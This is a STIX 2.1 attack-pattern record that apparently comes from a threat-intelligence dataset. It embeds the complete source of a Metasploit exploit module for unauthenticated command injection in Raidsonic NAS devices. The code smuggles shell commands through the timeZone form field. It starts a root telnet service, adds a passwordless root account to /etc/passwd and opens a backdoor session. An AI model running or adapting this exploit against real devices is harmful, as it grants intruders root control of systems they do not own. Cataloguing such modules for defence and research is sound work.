{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c6775fa7-f75b-474d-bf2b-d489180a3b42",
    "created": "2024-08-14T17:01:47.282979Z",
    "modified": "2024-08-14T17:01:47.282983Z",
    "name": "Raidsonic NAS Devices Unauthenticated Remote Command Execution",
    "description": " Different Raidsonic NAS devices are vulnerable to OS command injection via the web interface. The vulnerability exists in timeHandler.cgi, which is accessible without authentication. This module has been tested with the versions IB-NAS5220 and IB-NAS4220. Since this module is adding a new user and modifying the inetd daemon configuration, this module is set to ManualRanking and could cause target instability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/raidsonic_nas_ib5220_exec_noauth.rb",
            "external_id": "raidsonic_nas_ib5220_exec_noauth.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.s3cur1ty.de/m1adv2013-010"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking # It's backdooring the remote device\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  RESPONSE_PATTERN = \"\\<FORM\\ NAME\\=\\\"form\\\"\\ METHOD\\=\\\"POST\\\"\\ ACTION\\=\\\"\\/cgi\\/time\\/time.cgi\\\"\\ ENCTYPE\\=\\\"multipart\\/form-data\"\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Raidsonic NAS Devices Unauthenticated Remote Command Execution',\n      'Description' => %q{\n        Different Raidsonic NAS devices are vulnerable to OS command injection via the web\n        interface. The vulnerability exists in timeHandler.cgi, which is accessible without\n        authentication. This module has been tested with the versions IB-NAS5220 and\n        IB-NAS4220. Since this module is adding a new user and modifying the inetd daemon\n        configuration, this module is set to ManualRanking and could cause target instability.\n      },\n      'Author'      =>\n        [\n          'Michael Messner <devnull[at]s3cur1ty.de>', # Vulnerability discovery and Metasploit module\n          'juan vazquez' # minor help with msf module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'OSVDB', '90221' ],\n          [ 'EDB', '24499' ],\n          [ 'BID', '57958' ],\n          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-010' ]\n        ],\n      'DisclosureDate' => '2013-02-04',\n      'Privileged'     => true,\n      'Platform'       => 'unix',\n      'Payload'     =>\n        {\n          'Compat'  => {\n            'PayloadType'    => 'cmd_interact',\n            'ConnectionType' => 'find',\n          },\n        },\n      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'DefaultTarget'  => 0\n      ))\n\n    register_advanced_options(\n      [\n        OptInt.new('TelnetTimeout', [ true, 'The number of seconds to wait for a reply from a Telnet command', 10]),\n        OptInt.new('TelnetBannerTimeout', [ true, 'The number of seconds to wait for the initial banner', 25])\n      ])\n  end\n\n  def tel_timeout\n    (datastore['TelnetTimeout'] || 10).to_i\n  end\n\n  def banner_timeout\n    (datastore['TelnetBannerTimeout'] || 25).to_i\n  end\n\n  def exploit\n    telnet_port = rand(32767) + 32768\n\n    print_status(\"#{rhost}:#{rport} - Telnet port: #{telnet_port}\")\n\n    #first request\n    cmd = \"killall inetd\"\n    cmd = Rex::Text.uri_encode(cmd)\n    print_status(\"#{rhost}:#{rport} - sending first request - killing inetd\")\n\n    res = request(cmd)\n    #no server header or something that we could use to get sure the command is executed\n    if (!res or res.code != 200 or res.body !~ /#{RESPONSE_PATTERN}/)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to execute payload\")\n    end\n\n    #second request\n    inetd_cfg = rand_text_alpha(8)\n    cmd = \"echo \\\"#{telnet_port} stream tcp nowait root /usr/sbin/telnetd telnetd\\\" > /tmp/#{inetd_cfg}\"\n    cmd = Rex::Text.uri_encode(cmd)\n    print_status(\"#{rhost}:#{rport} - sending second request - configure inetd\")\n\n    res = request(cmd)\n    #no server header or something that we could use to get sure the command is executed\n    if (!res or res.code != 200 or res.body !~ /#{RESPONSE_PATTERN}/)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to execute payload\")\n    end\n    register_file_for_cleanup(\"/tmp/#{inetd_cfg}\")\n\n    #third request\n    cmd = \"/usr/sbin/inetd /tmp/#{inetd_cfg}\"\n    cmd = Rex::Text.uri_encode(cmd)\n    print_status(\"#{rhost}:#{rport} - sending third request - starting inetd and telnetd\")\n\n    res = request(cmd)\n    #no server header or something that we could use to get sure the command is executed\n    if (!res or res.code != 200 or res.body !~ /#{RESPONSE_PATTERN}/)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to execute payload\")\n    end\n\n    #fourth request\n    @user = rand_text_alpha(6)\n    cmd = \"echo \\\"#{@user}::0:0:/:/bin/ash\\\" >> /etc/passwd\"\n    cmd = Rex::Text.uri_encode(cmd)\n    print_status(\"#{rhost}:#{rport} - sending fourth request - configure user #{@user}\")\n\n    res = request(cmd)\n    #no server header or something that we could use to get sure the command is executed\n    if (!res or res.code != 200 or res.body !~ /#{RESPONSE_PATTERN}/)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to execute payload\")\n    end\n\n    print_status(\"#{rhost}:#{rport} - Trying to establish a telnet connection...\")\n    ctx = { 'Msf' => framework, 'MsfExploit' => self }\n    sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => telnet_port.to_i, 'Context' => ctx })\n\n    if sock.nil?\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Backdoor service has not been spawned!!!\")\n    end\n\n    add_socket(sock)\n\n    print_status(\"#{rhost}:#{rport} - Trying to establish a telnet session...\")\n    prompt = negotiate_telnet(sock)\n    if prompt.nil?\n      sock.close\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to establish a telnet session\")\n    else\n      print_good(\"#{rhost}:#{rport} - Telnet session successfully established...\")\n    end\n\n    handler(sock)\n\n  end\n\n  def request(cmd)\n\n    uri = '/cgi/time/timeHandler.cgi'\n\n    begin\n      res = send_request_cgi({\n        'uri'    => uri,\n        'method' => 'POST',\n        #not working without setting encode_params to false!\n        'encode_params' => false,\n        'vars_post' => {\n          \"month\"        => \"#{rand(12)}\",\n          \"date\"         => \"#{rand(30)}\",\n          \"year\"         => \"20#{rand(99)}\",\n          \"hour\"         => \"#{rand(12)}\",\n          \"minute\"       => \"#{rand(60)}\",\n          \"ampm\"         => \"PM\",\n          \"timeZone\"     => \"Amsterdam`#{cmd}`\",\n          \"ntp_type\"     => \"default\",\n          \"ntpServer\"    => \"none\",\n          \"old_date\"     => \" 1 12007\",\n          \"old_time\"     => \"1210\",\n          \"old_timeZone\" => \"Amsterdam\",\n          \"renew\"        => \"0\"\n          }\n        })\n      return res\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Could not connect to the webservice\")\n    end\n  end\n\n  def negotiate_telnet(sock)\n    login = read_telnet(sock, \"login: $\")\n    if login\n      sock.put(\"#{@user}\\r\\n\")\n    end\n    return read_telnet(sock, \"> $\")\n  end\n\n  def read_telnet(sock, pattern)\n    begin\n      Timeout.timeout(banner_timeout) do\n        while(true)\n          data = sock.get_once(-1, tel_timeout)\n          return nil if not data or data.length == 0\n          if data =~ /#{pattern}/\n            return true\n          end\n        end\n      end\n    rescue ::Timeout::Error\n      return nil\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-02-04",
    "x_mitre_platforms": [
        "unix'"
    ]
}